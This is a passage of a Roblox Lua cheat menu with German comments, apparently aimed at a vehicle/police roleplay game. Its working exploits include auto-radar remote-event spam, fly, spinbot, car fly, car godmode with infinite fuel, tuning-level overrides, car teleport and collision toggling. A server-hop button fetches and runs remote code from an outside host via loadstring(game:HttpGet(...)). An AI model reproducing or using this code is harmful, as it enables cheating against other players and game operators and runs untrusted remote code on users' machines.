		script.Parent.Text = autoRadarToggle and "Autoradar: AN" or "Autoradar: AUS"
	end)
	
	while wait(0.75) do
		if autoRadarToggle then
			local player = game:GetService("Players").LocalPlayer
			local radarGun = game.Players.LocalPlayer.Character:FindFirstChild("Radar Gun")
			if radarGun and radarRemoteEvent then
				for i, vehicle in pairs(workspace.Vehicles:GetChildren()) do
					local driveSeat = vehicle:FindFirstChild("DriveSeat")
					if driveSeat then
						radarRemoteEvent:FireServer(radarGun, driveSeat.Position, (driveSeat.Position - game.Players.LocalPlayer.Character.PrimaryPart.Position).Unit)
					end
				end
			end
		end
	end
end
task.spawn(SCRIPT_102)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.animation \\ --
local function SCRIPT_109()
local script = UI["109"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_109)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.Click Sound \\ --
local function SCRIPT_10a()
local script = UI["10a"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_10a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Fly.LocalScript \\ --
local function SCRIPT_10b()
local script = UI["10b"]
	local player = game:GetService("Players").LocalPlayer
	
	local flyingSpeed = 49
	local isFlying = false
	
	-- Fly-Funktionen
	local attachment, alignPosition, alignOrientation
	
	local function canFly()
		-- Spieler darf nicht fliegen, wenn er auf einem Sitz sitzt
		return player.Character:FindFirstChild("Humanoid").SeatPart == nil
	end
	
	local function enableFly()
		local humanoidRootPart = player.Character:FindFirstChild("HumanoidRootPart")
		local humanoid = player.Character:FindFirstChild("Humanoid")
		attachment = Instance.new("Attachment")
		attachment.Parent = humanoidRootPart
	
		alignPosition = Instance.new("AlignPosition")
		alignPosition.Attachment0 = attachment
		alignPosition.Mode = Enum.PositionAlignmentMode.OneAttachment
		alignPosition.MaxForce = 5000
		alignPosition.Responsiveness = 45
		alignPosition.Parent = humanoidRootPart
	
		alignOrientation = Instance.new("AlignOrientation")
		alignOrientation.Attachment0 = attachment
		alignOrientation.Mode = Enum.OrientationAlignmentMode.OneAttachment
		alignOrientation.MaxTorque = 5000
		alignOrientation.Responsiveness = 45
		alignOrientation.Parent = humanoidRootPart
	
		humanoid.PlatformStand = true
		isFlying = true
	
		local lastPosition = humanoidRootPart.Position
		alignPosition.Position = lastPosition
	
		local function flyLoop()
			while isFlying do
				local moveDirection = Vector3.new()
				local camCFrame = workspace.CurrentCamera.CFrame
	
				if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
					moveDirection += camCFrame.LookVector
				end
				if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.S) then
					moveDirection -= camCFrame.LookVector
				end
				if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.A) then
					moveDirection -= camCFrame.RightVector
				end
				if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.D) then
					moveDirection += camCFrame.RightVector
				end
	
				if moveDirection.Magnitude > 0 then
					moveDirection = moveDirection.Unit
					local newPosition = lastPosition + (moveDirection * flyingSpeed * game:GetService("RunService").Heartbeat:Wait())
					alignPosition.Position = newPosition
					lastPosition = newPosition
				end
	
				alignOrientation.CFrame = CFrame.new(Vector3.new(), camCFrame.LookVector)
				game:GetService("RunService").Heartbeat:Wait()
			end
		end
	
		spawn(flyLoop)
	end
	
	local function disableFly()
		isFlying = false
		player.Character:FindFirstChild("Humanoid").PlatformStand = false
		if attachment then attachment:Destroy() end
		if alignPosition then alignPosition:Destroy() end
		if alignOrientation then alignOrientation:Destroy() end
	end
	
	-- Taste P zum Aktivieren/Deaktivieren
	game:GetService("UserInputService").InputBegan:Connect(function(input)
		if input.KeyCode == Enum.KeyCode[script.Parent.Parent.Parent.Parent.Parent.Settings:GetAttribute("FlyKey")] then
			if isFlying then
				disableFly()
			else
				enableFly()
			end
		end
	end)
	
	-- Falls GUI-Button vorhanden ist
	if script.Parent:IsA("GuiButton") then
		script.Parent.MouseButton1Up:Connect(function()
			if isFlying then
				disableFly()
			else
				enableFly()
			end
		end)
	end
	
end
task.spawn(SCRIPT_10b)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.animation \\ --
local function SCRIPT_111()
local script = UI["111"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_111)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.Click Sound \\ --
local function SCRIPT_112()
local script = UI["112"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_112)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.ServerHob.LocalScript \\ --
local function SCRIPT_113()
local script = UI["113"]
	function Click(mouse)
		
		local PlaceID = game.PlaceId
	
		local function executeScript()
			wait(5) -- Wartezeit, um sicherzustellen, dass das Spiel vollstÃ¤ndig geladen ist
			loadstring(game:HttpGet("https://vortex-hub.pages.dev/api/vortex"))()
		end
	
		local function rejoin()
			local servers = game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/" .. PlaceID .. "/servers/Public?sortOrder=Asc&limit=100"))
			for _, server in pairs(servers.data) do
				if server.playing < server.maxPlayers then
					game:GetService("TeleportService"):TeleportToPlaceInstance(PlaceID, server.id, game.Players.LocalPlayer)
					wait(1) -- Wartezeit nach Teleport, bevor das Skript ausgefÃ¼hrt wird
					executeScript()
					return
				end
			end
			print("dont find a new server, wait...")
			wait(2)
			rejoin()
		end
	
		rejoin()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
	
end
task.spawn(SCRIPT_113)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.animation \\ --
local function SCRIPT_119()
local script = UI["119"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_119)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.Click Sound \\ --
local function SCRIPT_11a()
local script = UI["11a"]
	function Click(mouse)
	
		local sound = Instance.new("Sound")
		sound.SoundId = "rbxassetid://876939830"
		sound.Looped = false
		sound.Parent = workspace
		sound:Play()
	
	end
	
	script.Parent.MouseButton1Down:connect(Click)
end
task.spawn(SCRIPT_11a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Misc.ScrollingFrame1.Spinbot.LocalScript \\ --
local function SCRIPT_11b()
local script = UI["11b"]
	-- Referenzen zu den GUI-Elementen
	local button = script.Parent
	local player = game.Players.LocalPlayer
	local character = player.Character or player.CharacterAdded:Wait()
	local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
	
	local rotationSpeed = 60  -- Drehgeschwindigkeit
	local isRotating = false   -- Flag, das Ã¼berprÃ¼ft, ob der Spieler sich dreht
	
	-- Funktion, um die Drehung zu starten oder zu stoppen
	local function toggleRotation()
		isRotating = not isRotating  -- Toggle zwischen Drehen an/aus
	
		if isRotating then
			button.Text = "SpinBot: ON"  -- Button-Text Ã¤ndern, um anzuzeigen, dass die Drehung an ist
		else
			button.Text = "SpinBot: OFF"  -- Button-Text Ã¤ndern, um anzuzeigen, dass die Drehung aus ist
		end
	end
	
	-- Funktion, die in einer Schleife lÃ¤uft und den Spieler dreht
	local function rotatePlayer()
		while true do
			if isRotating then
				-- Drehe den Spieler um die Y-Achse
				humanoidRootPart.CFrame = humanoidRootPart.CFrame * CFrame.Angles(0, math.rad(rotationSpeed), 0)
			end
			wait(0.03)  -- Kleine Pause fÃ¼r die Schleife
		end
	end
	
	-- Starte die Dreh-Schleife im Hintergrund
	spawn(rotatePlayer)
	
	-- Button-Click-Event: Toggle die Drehung ein/aus
	button.MouseButton1Click:Connect(toggleRotation)
	
end
task.spawn(SCRIPT_11b)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.LocalScript \\ --
local function SCRIPT_12a()
local script = UI["12a"]
	local player = game:GetService("Players").LocalPlayer
	local RunService = game:GetService("RunService")
	local vehicleGodMode = false
	local lastVehicle = nil
	
	-- Optimierte Toggle-Funktion
	local function toggleGodMode()
		vehicleGodMode = not vehicleGodMode
		script.Parent.Text = vehicleGodMode and "Car God: ON" or "Car God: OFF"
	
		-- Cache des Fahrzeugs zurÃ¼cksetzen bei Deaktivierung
		if not vehicleGodMode then
			lastVehicle = nil
		end
	end
	
	script.Parent.MouseButton1Click:Connect(toggleGodMode)
	
	-- Performance-optimierte Hauptschleife
	local function updateVehicle()
		-- Nur ausfÃ¼hren wenn GodMode aktiv
		if not vehicleGodMode then return end
	
		-- Fahrzeug nur neu suchen wenn nicht gecached oder ungÃ¼ltig
		if not lastVehicle or not lastVehicle.Parent then
			local vehiclesFolder = workspace:FindFirstChild("Vehicles")
			lastVehicle = vehiclesFolder and vehiclesFolder:FindFirstChild(player.Name) or nil
		end
	
		-- Attribute setzen wenn Fahrzeug existiert
		if lastVehicle then
			lastVehicle:SetAttribute("IsOn", true)
			lastVehicle:SetAttribute("currentHealth", 500)
			lastVehicle:SetAttribute("currentFuel", math.huge)
		end
	end
	
	-- Heartbeat ist besser fÃ¼r Performance als RenderStepped
	RunService.Heartbeat:Connect(updateVehicle)
end
task.spawn(SCRIPT_12a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Car Godmode.animation \\ --
local function SCRIPT_12b()
local script = UI["12b"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_12b)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.LocalScript \\ --
local function SCRIPT_131()
local script = UI["131"]
	local flightEnabled = false
	local LP = game.Players.LocalPlayer
	local U_S_I = game:GetService("UserInputService")
	local flightSpeed = 1
	
	-- Button click toggle
	script.Parent.MouseButton1Up:Connect(function()
		flightEnabled = not flightEnabled
		if flightEnabled then
			script.Parent.Text = "Car Fly: ON"
		else
			script.Parent.Text = "Car Fly: OFF"
		end
	end)
	
	-- X key toggle
	U_S_I.InputBegan:Connect(function(input, gameProcessed)
		if not gameProcessed then
			if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode == Enum.KeyCode[script.Parent.Parent.Parent.Parent.Settings:GetAttribute("CarFlyKey")] then
				flightEnabled = not flightEnabled
				if flightEnabled then
					script.Parent.Text = "Car Fly: ON"
				else
					script.Parent.Text = "Car Fly: OFF"
				end
			end
		end
	end)
	
	-- Flight movement logic
	game:GetService("RunService").RenderStepped:Connect(function()
		if flightEnabled then
			if LP.Character then
				if LP.Character:FindFirstChild("Humanoid") then
					if LP.Character.Humanoid.Sit then
						local SeatPart = LP.Character:FindFirstChild("Humanoid").SeatPart
						if SeatPart and SeatPart.Name == "DriveSeat" then
							local Vehicle = SeatPart.Parent
							if Vehicle then
								if not Vehicle.PrimaryPart then
									Vehicle.PrimaryPart = SeatPart
								end
	
								local PrimaryPartCFrame = Vehicle:GetPrimaryPartCFrame()
								local cameraLook = workspace.CurrentCamera.CFrame.LookVector
	
								local PrimaryPartCFrame = Vehicle:GetPrimaryPartCFrame()
								Vehicle:SetPrimaryPartCFrame(CFrame.new(PrimaryPartCFrame.Position, PrimaryPartCFrame.Position + workspace.CurrentCamera.CFrame.LookVector) *
									CFrame.new(
										((U_S_I:IsKeyDown(Enum.KeyCode.D) and flightSpeed or 0) - 
											(U_S_I:IsKeyDown(Enum.KeyCode.A) and flightSpeed or 0)) * flightSpeed,
										((U_S_I:IsKeyDown(Enum.KeyCode.E) and flightSpeed / 2 or 0) - 
											(U_S_I:IsKeyDown(Enum.KeyCode.Q) and flightSpeed / 2 or 0)) * flightSpeed,
										((U_S_I:IsKeyDown(Enum.KeyCode.S) and flightSpeed or 0) - 
											(U_S_I:IsKeyDown(Enum.KeyCode.W) and flightSpeed or 0)) * flightSpeed
									))
								SeatPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
								SeatPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
							end
						end
					end
				end
			end
		end
	end)
end
task.spawn(SCRIPT_131)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.Carfly.animation \\ --
local function SCRIPT_132()
local script = UI["132"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_132)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.LocalScript \\ --
local function SCRIPT_139()
local script = UI["139"]
	local function bringCarToPlayer()
		local player = game.Players.LocalPlayer
	
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
			local humanoidRootPart = player.Character.HumanoidRootPart
			local car = workspace.Vehicles:FindFirstChild(player.Name) 
	
			if car then
				car.PrimaryPart = car:FindFirstChild("DriveSeat", true)
				local targetPosition = humanoidRootPart.Position + humanoidRootPart.CFrame.LookVector * 10 
				local lookAtPosition = humanoidRootPart.Position 
	
				car:SetPrimaryPartCFrame(CFrame.new(targetPosition, lookAtPosition))
	
				task.wait(0.5)
	
				car:FindFirstChild("DriveSeat", true):Sit(player.Character.Humanoid)
			end
		end
	end
	
	script.Parent.MouseButton1Up:Connect(function()
		bringCarToPlayer()
	end)	
end
task.spawn(SCRIPT_139)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.BringCar.animation \\ --
local function SCRIPT_13a()
local script = UI["13a"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_13a)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning.LocalScript \\ --
local function SCRIPT_13f()
local script = UI["13f"]
	local button = script.Parent
	local player = game:GetService("Players").LocalPlayer
	local vehicleFolder = workspace:WaitForChild("Vehicles")
	local currentLevel = 0
	
	-- Farben fÃ¼r jedes Level (nur Textfarbe wird geÃ¤ndert)
	local levelColors = {
		[0] = Color3.fromRGB(255, 50, 50),   -- Rot
		[1] = Color3.fromRGB(255, 100, 100),
		[2] = Color3.fromRGB(255, 150, 150),
		[3] = Color3.fromRGB(200, 200, 200),  -- Grau
		[4] = Color3.fromRGB(150, 255, 150),
		[5] = Color3.fromRGB(100, 255, 100),
		[6] = Color3.fromRGB(50, 255, 50)     -- GrÃ¼n
	}
	
	button.MouseButton1Click:Connect(function()
		-- Sanfter Ãœbergang durch Farbinterpolation
		local startColor = levelColors[currentLevel]
		currentLevel = (currentLevel + 1) % 7
		button.Text = "Tuning LVL: "..currentLevel
	
		-- FarbÃ¼bergang
		local endColor = levelColors[currentLevel]
		local steps = 10 -- Anzahl der Interpolationsschritte
		for i = 1, steps do
			local ratio = i/steps
			button.TextColor3 = startColor:Lerp(endColor, ratio)
			task.wait(0.02) -- Kurze Wartezeit fÃ¼r sanften Ãœbergang
		end
	
		local playerVehicle = vehicleFolder:FindFirstChild(player.Name)
		if playerVehicle then
			playerVehicle:SetAttribute("armorLevel", currentLevel)
			playerVehicle:SetAttribute("brakesLevel", currentLevel)
			playerVehicle:SetAttribute("engineLevel", currentLevel)
		end
	end)
	
	-- Initialisierung
	button.Text = "Tuning LVL: "..currentLevel
	button.TextColor3 = levelColors[currentLevel]
end
task.spawn(SCRIPT_13f)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Tuning.animation \\ --
local function SCRIPT_140()
local script = UI["140"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_140)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.LocalScript \\ --
local function SCRIPT_148()
local script = UI["148"]
	script.Parent.MouseButton1Up:Connect(function()
		pcall(function()
			for i, v in pairs(workspace.Vehicles[game.Players.LocalPlayer.Name].Wheels:GetChildren()) do
				v.Size = Vector3.new(2.6, 2.6, 2.6)
				v.CustomPhysicalProperties = nil
				for _, q in pairs(v.Parts:GetChildren()) do
					if q:IsA("MeshPart") then
						q.Transparency = 0
					end
				end
			end
		end)
	end)
end
task.spawn(SCRIPT_148)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.GodTires.animation \\ --
local function SCRIPT_149()
local script = UI["149"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_149)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.animation \\ --
local function SCRIPT_14e()
local script = UI["14e"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.03, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_14e)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Vehicle.ScrollingFrame2.Collisions.collission \\ --
local function SCRIPT_14f()
local script = UI["14f"]
	local toggle = false
	local VehiclesFolder = workspace.Vehicles
	local LocalPlayer = game.Players.LocalPlayer
	
	local function toggleCollisions()
		toggle = not toggle
		local vehicle = VehiclesFolder[LocalPlayer.Name]
	
		if vehicle then
			for i, v in pairs(vehicle:GetDescendants()) do
				if v:IsA("BasePart") then
					if not v:IsDescendantOf(vehicle:FindFirstChild("Wheels", true)) then
						v.CanCollide = not toggle
					else
						v.CanCollide = true
					end
				end
			end
	
			if vehicle:FindFirstChild("DriveSeat") then
				vehicle.DriveSeat.CanCollide = not toggle
			end
		end
	
		if toggle then
			script.Parent.Text = "Collisions: OFF"
		else
			script.Parent.Text = "Collisions: ON"
		end
	end
	
	script.Parent.MouseButton1Up:Connect(toggleCollisions)
	
	script.Parent.Text = "Collisions: ON"
end
task.spawn(SCRIPT_14f)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Nearest.animation \\ --
local function SCRIPT_153()
local script = UI["153"]
	local button = script.Parent
	local TweenService = game:GetService("TweenService")
	
	-- Definiere die Animation (Tween)
	local tweenInfo = TweenInfo.new(
		0.2, -- Zeit in Sekunden (kÃ¼rzer fÃ¼r schnellere Animation)
		Enum.EasingStyle.Quad, -- Easing-Stil
		Enum.EasingDirection.Out -- Easing-Richtung
	)
	
	local goalHover = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale - 0.01, button.Position.Y.Offset) -- Button um 5% nach oben bewegen
	}
	
	local goalNormal = {
		Position = UDim2.new(button.Position.X.Scale, button.Position.X.Offset, button.Position.Y.Scale, button.Position.Y.Offset) -- UrsprÃ¼ngliche Position zurÃ¼cksetzen
	}
	
	-- Funktion, um die Animation zu starten
	local function onMouseEnter()
		TweenService:Create(button, tweenInfo, goalHover):Play() -- Starte die Hover-Animation
	end
	
	-- Funktion, um die Animation zu stoppen
	local function onMouseLeave()
		TweenService:Create(button, tweenInfo, goalNormal):Play() -- Setze die Position zurÃ¼ck
	end
	
	-- Verbindung der Maus-Ereignisse
	button.MouseEnter:Connect(onMouseEnter)
	button.MouseLeave:Connect(onMouseLeave)
	
end
task.spawn(SCRIPT_153)
-- // StarterGui.RobloxUpdater1.MainTab.Frames.Teleport.Nearest.LocalScript \\ --
local function SCRIPT_156()
local script = UI["156"]
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local TweenService = game:GetService("TweenService")
	
	local VehiclesFolder = workspace:FindFirstChild("Vehicles")
	
	local function getLocationCFrame(location)
		if location == "Bank" then 
			return CFrame.new(-1174.68, 5.87, 3209.03)
		else
			return "No"
		end
	end
	
	local function tweenTo(destination)
